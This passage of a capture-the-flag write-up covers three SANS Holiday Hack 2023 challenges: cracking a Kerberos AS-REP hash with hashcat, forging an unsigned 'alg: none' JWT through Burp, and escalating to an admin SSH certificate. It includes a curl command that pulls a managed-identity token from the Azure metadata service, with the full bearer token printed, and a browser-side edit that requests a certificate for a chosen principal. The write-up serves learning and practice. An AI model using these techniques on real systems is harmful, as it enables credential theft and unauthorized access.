+`hashcat -m 18200 -a 0 -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 hash.txt password_list.txt --force`
+-m is hash type (Kerberos 5, etype 23, AS-REP, which in hashcat is 18200).
+-a is attack mode (0 is wordlist).
+Added suggested flags from terminal (also needed to add --force).
+
+After running the command, we were successful!
+
+```
+$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 AS-REP etype 23
+Hash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966
+Time.Started.....: Thu Dec 28 22:21:01 2023 (0 secs)
+Time.Estimated...: Thu Dec 28 22:21:01 2023 (0 secs)
+Guess.Base.......: File (password_list.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     1256 H/s (0.59ms) @ Accel:1 Loops:1 Thr:64 Vec:16
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 144/144 (100.00%)
+Rejected.........: 0/144 (0.00%)
+Restore.Point....: 0/144 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0
+Candidates.#1....: 1LuvCandyC4n3s!2022 -> iLuvC4ndyC4n3s!23!
+```
+
+Password is cracked: `IluvC4ndyC4nes!`
+
+## Elf Hunt
+
+### Objective
+
+Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.
+
+### Solution
+
+If we proxy our browser traffic through Burp while playing elfhunt and look in the Burp HTTP traffic. We will find this token (JSON Web Token):
+
+`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.`
+
+Decoded Header:
+
+```json
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+```
+
+Decoded Payload:
+
+```json
+{
+  "speed": -500
+}
+```
+
+JWTs have the following structure:
+`header.payload.signature`
+
+This JWT has no signature so the server has no way to verify if the token is from a trusted source. This means all we have to do is encode a new payload with a slower speed, append it to the header and then replace that token in our HTTP calls with Burp.
+
+Lets encode a new payload with the following data:
+
+```json
+{
+  "speed": -100
+}
+```
+
+We can use the following command
+
+```
+echo -n "{\"speed\":\"-100\"}" | base64 | tr '/+' '_-' | tr -d '='
+```
+
+This base64 encodes our payload, then url encodes the string by translating the characters (/ to \_ and + to -), then finally deletes all = characters.
+
+This gives us our payload: `eyJzcGVlZCI6LTEwMH0`.
+
+We can append this to the encoded signature portion from the original token like so:
+`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTEwMH0.`
+
+Now lets create some Burp rules to swap in our token with the original.
+
+Looking through the burp proxy logs, we see a request to the following url:
+`https://elfhunt.org/?&challenge=elfhunt&username=<myuser>&id=<myuserid>&area=pi-rainrastercliffs&location=27,18&tokens=elfhunt&dna=<longdnatokenhere>`
+
+It is the response from this request that gives the JWT that the browser will save in the cookies and pass to the elfhunt game. What we need to do is replace this token in the response with our new token, so that the browser thinks its the real one and saves it instead. Then when the game loads, the browser will pass this token to the server with our new set speed and slow the elves down.
+
+![http response](images/elfhunt/response.png)
+
+We can do this by creating a "Match and Replace" rule in Burp.
+
+![match and replace](images/elfhunt/matchandreplace.png)
+
+Now, make sure you close the elfhunt game and delete all cookies from your browser. This will force your browser to set a new elfhunt cookie when you start the game again. Now start elfhunt with your match and replace rule active. When your browser sends the initial request, the response with the JWT is replaced with our new JWT. Once the game loads you should see the elves flying much slower. Shoot down 75 elves to win.
+
+![victory](images/elfhunt/victory.png)
+
+## Certificate SSHenanigans
+
+### Objective
+
+Alabaster snowball needs help with his azure server at ssh-server-vm.santaworkshopgeeseislands.org. The Host is using SSH certificates. ChatNPT generated ready to deplpoy code for an azure function app https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl. He wants us to take a look at it before deploying to all the Geese Island Servers.
+
+Key notes that Alabaster tells us:
+
+1. Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list.
+
+2. If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently.
+
+3. Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed. https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01
+
+### Generate SSH Keypair
+
+Generate the SSH Keypair as you normally would (with `ssh-keygen`) and save in .ssh directory.
+
+### Get Certificate from WebApp
+
+Go to the webapp Alabaster set up at [here](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) and paste in the contents of your public key that you just created. Your public key should be in the .ssh directory in your home directory and should have a file extension of `.pub`. Click the submit button, and you should be returned something like this:
+
+```json
+{
+  "ssh_cert": "rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACcxMjM1ODAxMDQyMDcyODYxMjI5NDQzNzI5NzcyOTA5ODEwMzgyOTgAAAADAQABAAABgQDG/rgyfAENUlePU1cQ++MDYlyPOeRQ7NKE5Gj4M+SpkVjFmXXXKvy+kpgArTAf7zerLdGeIrDuK9sPDz+nzKIfYJF8BjDeVE6iaUPw1JsTKLxWWQ35LUIZ1VjJEzfRQvFKb4e07ILW4tyzdHHmSQmBBxDGHRUWPiPgKhVFwZUL4DzsQ5dEuZlVZtThs7/Y7AOb0RNDi+7wFJGjLLrlNI4IOUS6m5W58vLLEVR3cwLJ0cX9GZhaK//Gpks8xMdr28ydKC8WcfGkSuObuStLS/TMakvZiny0uq7d6sfTTyQuYU1HkzK/zBvge2/f81MewWiT8OaCbglFtpzn3RbWZFORmEm8dr6nTgpf4ZeCgj6HTqbHExdyhvZPI4ZC/wcyiIxE3UgnYEyYFbaUe8AjwuXe1Uvjdqj2HFQ+jiz53o7XokUtPmoDGQVtykaBhHkmYauJqWvs2hGiBYu0HLf6kHdCzjcJlXFOfzuzCQ9UGQLj84H2fykGcJSOOJkPK2+XsIMAAAAAAAAAAQAAAAEAAAAkNWRiMmExYTUtNGY1MS00ZWJhLWE1NzYtMTBkYjlkZDk5ZDViAAAABwAAAANlbGYAAAAAZXOPZwAAAABlmHqTAAAAAAAAABIAAAAKcGVybWl0LXB0eQAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACBpNhjTApiZFzyRx0UB/fkzOAka7Kv+wS9MKfj+qwiFhwAAAFMAAAALc3NoLWVkMjU1MTkAAABAik5knNj8qv7+7OQSnMjBG+5a83Cwc+H3OTA6zPAeG73jclbouoG/ZJHW70sd49kgB/UX1Irb+XShXNxW+3XYAg== ",
+  "principal": "elf"
+}
+```
+
+This data is an SSH certificate along with the principal user. Create a file with the 'ssh-cert' content in it and save it in the `.ssh` directory.
+
+### SSH into the server
+
+Now we can SSH into the server with the following command, using both our private key and certificate file we just created as our identity for SSH.
+
+`ssh -i ~/.ssh/<private-key-filename> -i ~/.ssh/<certificate-filename> monitor@ssh-server-vm.santaworkshopgeeseislands.org`
+
+When the terminal loads, we see some sort of satellite tracker.
+
+![satellite tracker](images/sshenanigans/satellite_tracker.png)
+
+If we press Ctrl+C we can escape to a shell for the user monitor.
+
+![monitor shell](images/sshenanigans/monitor_shell.png)
+
+### Get Azure Token
+
+Now, we know Alabaster told us to take a look at his code on Azure using the `get-source-control` endpoint. To use this endpoint we will need an access token. Lets see if we can use the Azure API to get that first.
+
+From this site https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token we can look at the example for getting a token using CURL.
+
+`curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s`
+
+**Note:** This command must be run from the monitor VM.
+
+Here is the response:
+
+```json
+{
+  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIwNzU4MzUsIm5iZiI6MTcwMjA3NTgzNSwiZXhwIjoxNzAyMTYyNTM1LCJhaW8iOiJFMlZnWUJDcnM2aHRZdUc3M3ZkOTdmYUlmZTRWQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJ2OUM2UUp3b3NrTzFfN0dwTU5oUkFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.W35Plfsx-EntGdcvD9ItODSIEAAD95vicj1ZLDXZsPFaFgYZGtXYF7BHBC5cKYFQk0i0GotXBk2Zqfcgw7E5RKUpk-ew9onK2f6VsFnSvhN98keDnWp3Xl1kumSN-s_-ptqRyX15_G8-nDJzwjl3GvpUDYOMpo_SAdhUw_rnLKvfuUn6VCHkK6Jlqqipqp-i5ereLCRr6xCNeoe4A8xnAGrEuA6RaDjsEdDKgEm-ok67y6NU2JElQ8v8RUKENeJTmvDrNPLYdCsBx3dVYaYcYxd97maqMGhhkqRo6M8uUDtuSbSBPOrb9DI-Az0XlxJEIGGLDD1abtDjadwwWRQjIw",
+  "client_id": "b84e06d3-aba1-4bcc-9626-2e0d76cba2ce",
+  "expires_in": "84153",
+  "expires_on": "1702162535",
+  "ext_expires_in": "86399",
+  "not_before": "1702075835",
+  "resource": "https://management.azure.com/",
+  "token_type": "Bearer"
+}
+```
+
+### Look at the Get Source Control Azure API endpoint
+
+Now that we have a token we can try to access the `get-source-control` endpoint.
+
+We can find the API spec here:
+
+https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01
+
+Example URL:
+
+`GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01`
+
+So looking at this documentation, it seems we first need to find the following:
+
+1. subscriptionId
+2. resourceGroupName
+3. Site name
+
+We can probably find this with the Azure API using our token. Lets try.
+
+#### SubscriptionId
+
+Here is an endpoint for the Azure API Endpoint to list subscriptions:
+
+GET https://management.azure.com/subscriptions?api-version=2022-12-01
+
+Source: https://learn.microsoft.com/en-us/rest/api/resources/subscriptions/list?view=rest-resources-2022-12-01&tabs=HTTP
+
+Request:
+
+```s
+curl https://management.azure.com/subscriptions?api-version=2022-12-01 -H 'Authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIwNzU4MzUsIm5iZiI6MTcwMjA3NTgzNSwiZXhwIjoxNzAyMTYyNTM1LCJhaW8iOiJFMlZnWUJDcnM2aHRZdUc3M3ZkOTdmYUlmZTRWQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJ2OUM2UUp3b3NrTzFfN0dwTU5oUkFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.W35Plfsx-EntGdcvD9ItODSIEAAD95vicj1ZLDXZsPFaFgYZGtXYF7BHBC5cKYFQk0i0GotXBk2Zqfcgw7E5RKUpk-ew9onK2f6VsFnSvhN98keDnWp3Xl1kumSN-s_-ptqRyX15_G8-nDJzwjl3GvpUDYOMpo_SAdhUw_rnLKvfuUn6VCHkK6Jlqqipqp-i5ereLCRr6xCNeoe4A8xnAGrEuA6RaDjsEdDKgEm-ok67y6NU2JElQ8v8RUKENeJTmvDrNPLYdCsBx3dVYaYcYxd97maqMGhhkqRo6M8uUDtuSbSBPOrb9DI-Az0XlxJEIGGLDD1abtDjadwwWRQjIw'
+```
+
+Response:
+
+```json
+{
+  "value": [
+    {
+      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64",
+      "authorizationSource": "RoleBased",
+      "managedByTenants": [],
+      "tags": {
+        "sans:application_owner": "SANS:R&D",
+        "finance:business_unit": "curriculum"
+      },
+      "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
+      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
+      "displayName": "sans-hhc",
+      "state": "Enabled",
+      "subscriptionPolicies": {
+        "locationPlacementId": "Public_2014-09-01",
+        "quotaId": "EnterpriseAgreement_2014-09-01",
+        "spendingLimit": "Off"
+      }
+    }
+  ],
+  "count": { "type": "Total", "value": 1 }
+}
+```
+
+So our subscription id is:
+`2b0942f3-9bca-484b-a508-abdae2db5e64`
+
+#### ResourceGroupName
+
+We can use this endpoint:
+
+GET https://management.azure.com/subscriptions/{subscriptionId}/resourcegroups?api-version=2021-04-01
+
+Source: https://learn.microsoft.com/en-us/rest/api/resources/resource-groups/list?view=rest-resources-2021-04-01
+
+Request:
+
+```s
+curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups?api-version=2022-12-01 -H 'Authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIwNzU4MzUsIm5iZiI6MTcwMjA3NTgzNSwiZXhwIjoxNzAyMTYyNTM1LCJhaW8iOiJFMlZnWUJDcnM2aHRZdUc3M3ZkOTdmYUlmZTRWQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJ2OUM2UUp3b3NrTzFfN0dwTU5oUkFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.W35Plfsx-EntGdcvD9ItODSIEAAD95vicj1ZLDXZsPFaFgYZGtXYF7BHBC5cKYFQk0i0GotXBk2Zqfcgw7E5RKUpk-ew9onK2f6VsFnSvhN98keDnWp3Xl1kumSN-s_-ptqRyX15_G8-nDJzwjl3GvpUDYOMpo_SAdhUw_rnLKvfuUn6VCHkK6Jlqqipqp-i5ereLCRr6xCNeoe4A8xnAGrEuA6RaDjsEdDKgEm-ok67y6NU2JElQ8v8RUKENeJTmvDrNPLYdCsBx3dVYaYcYxd97maqMGhhkqRo6M8uUDtuSbSBPOrb9DI-Az0XlxJEIGGLDD1abtDjadwwWRQjIw'
+```
+
+Response:
+
+```json
+{
+  "value": [
+    {
+      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
+      "name": "northpole-rg1",
+      "type": "Microsoft.Resources/resourceGroups",
+      "location": "eastus",
+      "tags": {},
+      "properties": { "provisioningState": "Succeeded" }
+    }
+  ]
+}
+```
+
+So our resourceGroupId is: `northpole-rg1`
+
+### Site Name
+
+I am assuming that the site name is just the subdomain of the url where the SSH website is:
+https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
+
+Site Name: `northpole-ssh-certs-fa`
+
+This is a common pattern with cloud deployments. We will try and see if it works.
+
+#### Try the Get Source Control Azure endpoint
+
+Now we have all three things we needed, let's try and see if it works. We can use the endpoint here:
+
+GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01
+
+Request:
+
+```s
+curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01 -H 'Authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIwNzU4MzUsIm5iZiI6MTcwMjA3NTgzNSwiZXhwIjoxNzAyMTYyNTM1LCJhaW8iOiJFMlZnWUJDcnM2aHRZdUc3M3ZkOTdmYUlmZTRWQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJ2OUM2UUp3b3NrTzFfN0dwTU5oUkFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.W35Plfsx-EntGdcvD9ItODSIEAAD95vicj1ZLDXZsPFaFgYZGtXYF7BHBC5cKYFQk0i0GotXBk2Zqfcgw7E5RKUpk-ew9onK2f6VsFnSvhN98keDnWp3Xl1kumSN-s_-ptqRyX15_G8-nDJzwjl3GvpUDYOMpo_SAdhUw_rnLKvfuUn6VCHkK6Jlqqipqp-i5ereLCRr6xCNeoe4A8xnAGrEuA6RaDjsEdDKgEm-ok67y6NU2JElQ8v8RUKENeJTmvDrNPLYdCsBx3dVYaYcYxd97maqMGhhkqRo6M8uUDtuSbSBPOrb9DI-Az0XlxJEIGGLDD1abtDjadwwWRQjIw'
+```
+
+Response:
+
+```json
+{
+  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
+  "name": "northpole-ssh-certs-fa",
+  "type": "Microsoft.Web/sites/sourcecontrols",
+  "location": "East US",
+  "tags": {
+    "project": "northpole-ssh-certs",
+    "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
+  },
+  "properties": {
+    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
+    "branch": "main",
+    "isManualIntegration": false,
+    "isGitHubAction": true,
+    "deploymentRollbackEnabled": false,
+    "isMercurial": false,
+    "provisioningState": "Succeeded",
+    "gitHubActionConfiguration": {
+      "codeConfiguration": null,
+      "containerConfiguration": null,
+      "isLinux": true,
+      "generateWorkflowFile": true,
+      "workflowSettings": {
+        "appType": "functionapp",
+        "publishType": "code",
+        "os": "linux",
+        "variables": { "runtimeVersion": "3.11" },
+        "runtimeStack": "python",
+        "workflowApiVersion": "2020-12-01",
+        "useCanaryFusionServer": false,
+        "authType": "publishprofile"
+      }
+    }
+  }
+}
+```
+
+The response gives us a github url.
+
+https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa
+
+Lets take a look and see what we can find.
+
+Looking at the code in `function_app.py`, we can see that the parse input function does take a 'principal' field if it is supplied in the request, but just uses a default one if not. This can be seen in the following line of code on line 45:
+
+```py
+principal = data.get("principal", DEFAULT_PRINCIPAL)
+```
+
+Knowing this, we can exploit it by sending in our own principal value, as long as we know the correct principal to use. Let's try and find what that is.
+
+Looking at the home directory on the vm, we can see the user alabaster. We need to figure out the principal name for alabaster's user. After some searching. There is a directory `/etc/ssh/auth_principals` with two files in it; `alabaster` and `monitor`. The `monitor` file has `elf` inside it and the `alabaster` file has `admin` inside it. "elf" was the principal that we we're automatically given when we generated our SSH certificate, so `admin` must be the correct principal for alabaster's account.
+
+Now we are going to try generating another ssh key pair and supplying the `"principal": "admin"` (seen in /etc/ssh/principals directory on server) to get a ssh certificate for alabasters account. We can edit the website code to do this in our browser. Lets try.
+
+Looking at the website source, we can see the following code in the `submitForm` function.
+
+```
+fetch(postUrl, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({
+    ssh_pub_key: sshPubKey,
+  }),
+})
+```
+
+Copy the entire submitForm function into a text file and add one line under `ssh_pub_key` to put our principal value in.
+`principal: "admin"`.
+
+The whole submitForm function should look like this now:
+
+```js
+function submitForm(event) {
+  event.preventDefault();
+
+  const outputElement = document.getElementById("response_output");
+  const spinnerElement = document.getElementById("wait_message");
+
+  spinnerElement.style.display = "block";
+  outputElement.style.display = "none";
+
+  const sshPubKey = document.getElementById("ssh_pub_key_textarea").value;
+  const codeParam = getQueryParam("code");
+  let postUrl = "/api/create-cert";
+
+  if (codeParam) {
+    postUrl += `?code=${codeParam}`;
+  }
+
+  fetch(postUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      ssh_pub_key: sshPubKey,
+      principal: "admin",
+    }),
+  })
+    .then((response) => {
+      const contentType = response.headers.get("content-type");
+
+      if (contentType && contentType.includes("application/json")) {
+        return response
+          .json()
+          .then((data) => ({ status: response.status, body: data }));
+      }
+
+      throw new Error(`Unexpected content type: ${contentType}`);
+    })
+    .then((responseData) => {
+      spinnerElement.style.display = "none";
+
+      if (responseData.status >= 200 && responseData.status < 300) {
+        outputElement.classList.add("success-output");
+        outputElement.classList.remove("error-output");
+      } else {
+        outputElement.classList.add("error-output");
+        outputElement.classList.remove("success-output");
+      }
+
+      outputElement.innerText = JSON.stringify(responseData.body, null, 4);
+      outputElement.style.display = "block";
+    })
+    .catch((error) => {
+      console.error("Error:", error);
+
